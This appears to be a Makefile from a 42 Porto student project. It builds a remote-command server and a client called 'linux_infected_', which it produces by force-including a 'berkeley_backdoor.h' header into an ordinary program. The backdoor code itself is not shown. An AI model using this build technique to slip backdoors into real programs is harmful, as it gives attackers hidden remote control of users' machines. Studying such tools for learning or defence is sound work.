# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    Makefile                                           :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: joesanto <joesanto@student.42porto.com>    +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2026/01/10 19:15:36 by joesanto          #+#    #+#              #
#    Updated: 2026/01/10 22:00:13 by joesanto         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

CC = cc
FLAGS = -Wall -Wextra -Werror -g
SRCS_DIR = srcs
INFECT_PROGRAM = $(SRCS_DIR)/program_test.c
INCLUDES = -Iincludes

# ----------------------------------- BINS ----------------------------------- #
BIN_DIR = bin
PROGRAM_NAME := $(notdir $(basename $(INFECT_PROGRAM)))

# CLIENT (LINUX)
LINUX_CLIENT = $(BIN_DIR)/linux_infected_$(PROGRAM_NAME)

# SERVER (LINUX)
LINUX_SERVER = $(BIN_DIR)/linux_server

# ----------------------------------- LIBS ----------------------------------- #
LIBS_DIR = libs

# LIBFT
LIBFT = $(LIBS_DIR)/libft/libft.a
INCLUDES += -I$(LIBS_DIR)/libft

# ---------------------------------- SOURCES --------------------------------- #

# CLIENT (LINUX)
CLIENT_DIR = $(SRCS_DIR)/client
BACKDOORS_DIR = $(CLIENT_DIR)/backdoors
CLIENT_CONNECTION_DIR = $(CLIENT_DIR)/socket_client_connection

LINUX_BACKDOOR = $(BACKDOORS_DIR)/berkeley_backdoor.h
LINUX_CLIENT_CONNECTION_SRCS = $(CLIENT_CONNECTION_DIR)/berkeley_client_connection.c
LINUX_CLIENT_OBJS += $(LINUX_CLIENT_CONNECTION_SRCS:.c=.o) $(INFECT_PROGRAM:.c=.o)

# SERVER (LINUX)
SERVER_DIR = $(SRCS_DIR)/server
PROMPT_COMMAND_DIR = $(SERVER_DIR)/prompt_command
SERVER_CONNECTION_DIR = $(SERVER_DIR)/socket_server_connection

LINUX_SERVER_MAIN = $(SERVER_DIR)/berkeley_server.c
LINUX_SERVER_CONNECTION_SRCS = $(SERVER_CONNECTION_DIR)/berkeley_server_connection.c
PROMPT_COMMAND = $(addprefix $(PROMPT_COMMAND_DIR)/, prompt_command.c receive_command_output.c)

INCLUDES += -I$(PROMPT_COMMAND_DIR)/includes
LINUX_SERVER_OBJS += $(LINUX_SERVER_MAIN:.c=.o) $(LINUX_SERVER_CONNECTION_SRCS:.c=.o) \
	$(PROMPT_COMMAND:.c=.o)

# -------------------------------- COMPILATION ------------------------------- #

all: $(LINUX_CLIENT) $(LINUX_SERVER)

$(LINUX_SERVER): $(LIBFT) $(LINUX_SERVER_OBJS)
	$(CC) $(LINUX_SERVER_OBJS) $(LIBFT) -o $@

$(LINUX_CLIENT): FLAGS += -include $(LINUX_BACKDOOR)
$(LINUX_CLIENT): $(LINUX_CLIENT_OBJS)
	$(CC) $^ -o $@

$(LIBFT):
	@if [ ! -d "$(dir $@)" ]; then \
		git clone git@github.com:joelsantossouza/libft.git $(dir $@); \
	fi
	make -C $(dir $@)

%.o: %.c
	$(CC) $(FLAGS) $(INCLUDES) -c $< -o $@

clean:
	rm -f $(LINUX_CLIENT_OBJS)

fclean: clean
	rm -f $(LINUX_CLIENT)
	rm -f $(LINUX_SERVER)

re: fclean all
